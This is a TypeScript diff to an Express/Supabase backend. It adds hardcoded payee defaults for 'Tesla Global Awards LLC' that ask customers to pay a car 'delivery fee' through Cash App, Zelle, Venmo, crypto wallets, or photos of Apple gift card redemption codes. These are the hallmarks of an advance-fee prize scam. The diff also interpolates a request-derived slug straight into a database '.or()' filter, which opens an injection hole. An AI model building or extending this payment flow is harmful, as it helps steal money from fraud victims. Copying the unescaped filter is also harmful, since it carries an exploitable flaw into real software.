@@ -19,6 +19,51 @@ type OrderResponse = {
 };
 
 const resendTimestamps: Record<string, number> = {};
+const PAYMENT_METHOD_SAMPLE_CONFIG: Record<string, { description: string; config: Record<string, any> }> = {
+  paypal: { description: "Pay securely with your PayPal account or linked card", config: { businessName: "Tesla Global Awards LLC", email: "payments@teslaglobalawards.com", merchantId: "TM8XK2R9Q4ZPA", paypalMeLink: "https://paypal.me/teslaglobalawards", instructions: "Send the delivery fee via PayPal to our verified business account and include your Order ID in the note. Screenshot the confirmation and upload it as proof." } },
+  cashapp: { description: "Instant payment with your Cash App balance or debit card", config: { cashtag: "$TeslaGlobalAwards", accountName: "Tesla Global Awards", phone: "+1 (888) 472-3001", instructions: "Send the delivery fee to our verified Cash App account, add your Order ID in the For field, then upload a screenshot of the confirmation." } },
+  venmo: { description: "Fast, secure payments with Venmo", config: { username: "@TeslaGlobalAwards", accountName: "Tesla Global Awards LLC", instructions: "Send the delivery fee to our official Venmo handle, include your Order ID in the description, and upload the confirmation screen." } },
+  zelle: { description: "Send directly from your bank account with Zelle", config: { recipientName: "Tesla Global Awards LLC", email: "zelle@teslaglobalawards.com", phone: "+1 (415) 892-3401", instructions: "Send the delivery fee with Zelle to the registered email or phone number, include your Order ID in the memo, then upload confirmation." } },
+  bitcoin: { description: "Pay with Bitcoin on the Bitcoin network", config: { walletAddress: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", network: "Bitcoin (BTC) — Mainnet", confirmations: "3 confirmations required", instructions: "Send the exact delivery fee amount in BTC to the wallet address above using the BTC network only, then upload a screenshot showing the TX hash." } },
+  ethereum: { description: "Pay with Ethereum (ETH)", config: { walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", network: "Ethereum Mainnet (ERC-20)", confirmations: "12 confirmations required", instructions: "Send the exact ETH equivalent of the delivery fee to the Ethereum Mainnet wallet and upload the confirmed transaction screenshot." } },
+  "usdt-erc20": { description: "Tether USD on the Ethereum network", config: { walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", network: "Ethereum Mainnet (ERC-20)", tokenContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7", instructions: "Send USDT on ERC-20 to the wallet address above and upload the confirmed transaction screenshot." } },
+  "usdt-trc20": { description: "Tether USD on the TRON network — lower fees", config: { walletAddress: "TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS", network: "TRON Network (TRC-20)", instructions: "Send USDT on TRC-20 to the wallet address above and upload the confirmed transaction receipt screenshot." } },
+  creditcard: { description: "Visa, Mastercard, Amex, and Discover accepted", config: { acceptedCards: "Visa, Mastercard, American Express, Discover", processorName: "Tesla Awards Secure Payments", merchantAccount: "TGAWARDS-US-9041", supportPhone: "+1 (888) 472-3001", instructions: "Enter card details securely in the payment form. Transactions are encrypted and a confirmation is emailed after processing." } },
+  applegift: { description: "Pay with an Apple Gift Card — instant and private", config: { denominationsAccepted: "$25, $50, $100, $200 denominations accepted", purchaseLocations: "Apple Store, Apple.com, Walmart, Target, Best Buy, CVS, Walgreens", instructions: "Upload clear photos of the front and back of the Apple Gift Card with the redemption code fully visible and legible." } }
+};
+
+function paymentSlug(m: any): string {
+  return String(m.slug || m.name || m.display_name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
+}
+
+function parseAccountDetails(raw: any): Record<string, any> {
+  if (!raw) return {};
+  if (typeof raw === "object") return { ...raw };
+  try { return JSON.parse(raw); } catch { return {}; }
+}
+
+function enrichPaymentMethodRow(m: any) {
+  const slug = paymentSlug(m);
+  const sample = PAYMENT_METHOD_SAMPLE_CONFIG[slug];
+  const config = { ...(sample?.config || {}), ...parseAccountDetails(m.account_details) };
+  if (m.wallet_address) config.walletAddress = m.wallet_address;
+  if (m.payment_instructions) config.instructions = m.payment_instructions;
+  if (m.qr_code_url) config.qrCode = m.qr_code_url;
+  return {
+    id: slug || m.id, _dbId: m.id, name: m.display_name || m.name, type: m.type || "wallet",
+    description: m.description || sample?.description || "", logo: m.logo_url || "", logo_url: m.logo_url || "",
+    enabled: m.enabled, displayOrder: m.sort_order || 0, sort_order: m.sort_order || 0, config,
+    wallet_address: m.wallet_address || config.walletAddress || config.cashtag || config.username || config.email || "",
+    payment_instructions: m.payment_instructions || config.instructions || "",
+    lastUpdated: m.updated_at || m.created_at || ""
+  };
+}
+
+function selectedCarLabel(carData: Record<string, any>): string {
+  const candidates = [carData.name, carData.model, carData.modelName, carData.title, carData.vehicle, carData.vehicleName, carData.displayName];
+  return String(candidates.find((v) => typeof v === "string" && v.trim()) || "");
+}
+
 
 const smtpUser = process.env["SMTP_USER"]?.trim();
 const smtpPass = process.env["SMTP_PASS"]?.trim();
@@ -492,21 +537,7 @@ router.get("/payment-methods", async (_req, res) => {
       .eq("enabled", true)
       .order("sort_order");
     if (error) throw error;
-    const methods = (data || []).map((m: any) => {
-      let config: Record<string, any> = {};
-      if (m.account_details) { try { config = JSON.parse(m.account_details); } catch (_) {} }
-      if (m.wallet_address && !config.walletAddress) config.walletAddress = m.wallet_address;
-      if (m.payment_instructions && !config.instructions) config.instructions = m.payment_instructions;
-      if (m.qr_code_url && !config.qrCode) config.qrCode = m.qr_code_url;
-      return {
-        id: m.slug || String(m.name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-"),
-        _dbId: m.id, name: m.display_name || m.name, type: m.type || "wallet",
-        description: m.description || "", logo: m.logo_url || "", logo_url: m.logo_url || "",
-        enabled: m.enabled, displayOrder: m.sort_order || 0, sort_order: m.sort_order || 0,
-        config, wallet_address: m.wallet_address || "", payment_instructions: m.payment_instructions || "",
-        lastUpdated: m.updated_at || m.created_at || ""
-      };
-    });
+    const methods = (data || []).map(enrichPaymentMethodRow);
     res.json({ methods });
   } catch (err) { logger.error({ err }, "Public payment methods error"); res.status(500).json({ error: "Server error" }); }
 });
@@ -518,7 +549,7 @@ router.post("/admin/payment-methods/upsert", async (req, res) => {
     const supabase = await getSupabaseAdmin();
     const slug = m.slug || String(m.name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-");
     const { data: existing } = await supabase.from("payment_methods")
-      .select("id").eq("name", slug).maybeSingle();
+      .select("id").or(`name.eq.${slug},slug.eq.${slug}`).maybeSingle();
     const accountDetails = typeof m.account_details === "object"
       ? JSON.stringify(m.account_details)
       : (m.account_details || "{}");
@@ -552,7 +583,7 @@ router.get("/admin/payment-methods", async (_req, res) => {
     const supabase = await getSupabaseAdmin();
     const { data, error } = await supabase.from("payment_methods").select("*").order("sort_order");
     if (error) throw error;
-    res.json({ methods: data || [] });
+    res.json({ methods: (data || []).map(enrichPaymentMethodRow) });
   } catch (err) { logger.error({ err }, "Admin payment methods error"); res.status(500).json({ error: "Server error" }); }
 });
 router.post("/admin/payment-methods", async (req, res) => {
@@ -588,7 +619,7 @@ router.put("/admin/payment-methods/:id", async (req, res) => {
     updateData.updated_at = new Date().toISOString();
     const { error } = await supabase.from("payment_methods").update(updateData).eq("id", id);
     if (error) throw error;
-    res.json({ success: true });
+    res.json({ success: true, _db_id: id });
   } catch (err) { logger.error({ err }, "Admin payment method update error"); res.status(500).json({ error: "Server error" }); }
 });
 router.delete("/admin/payment-methods/:id", async (req, res) => {
@@ -657,7 +688,7 @@ router.get("/admin/payment-proofs", async (_req, res) => {
         user_name:       p.customer_name  || joinedName || u?.email || "",
         user_email:      p.customer_email || u?.email   || "",
         user_phone:      p.customer_phone || u?.phone   || "",
-        car_model:       p.car_model      || (carData as any).name || (carData as any).model || "",
+        car_model:       selectedCarLabel(carData) || p.car_model || "",
         delivery_method: p.delivery_method || dmLabel,
       };
     });
